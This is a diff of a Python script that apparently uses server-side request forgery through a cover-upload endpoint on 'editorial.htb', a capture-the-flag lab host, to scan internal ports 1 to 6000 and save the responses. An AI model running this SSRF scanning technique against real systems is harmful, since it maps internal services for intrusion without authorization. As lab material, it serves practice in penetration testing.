@@ -1,9 +1,10 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor
+import os
 
 url = "http://editorial.htb/upload-cover"
-boundary = "boundary_value"
-expected_response = '/static/images/expected_image.jpeg'
+boundary = "14276312323520530593225841561"
+expected_response = '/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg'
 
 def make_request(port):
     data = (
@@ -19,10 +20,15 @@ def make_request(port):
     try:
         response = requests.post(url, data=data, headers=headers)
         if response.text != expected_response:
-            print(f'Open port found: {port}')
-    except requests.RequestException:
-        pass
+            with open(f'port_{port}_response.html', 'w') as file:
+                file.write(response.text)
+            print(f'Open port found: {port}, response saved to port_{port}_response.html')
+    except requests.RequestException as e:
+        print(f"Request failed for port {port}: {e}")
 
 if __name__ == "__main__":
+    if not os.path.exists('responses'):
+        os.makedirs('responses')
+    os.chdir('responses')
     with ThreadPoolExecutor(max_workers=50) as executor:
         executor.map(make_request, range(1, 6001))
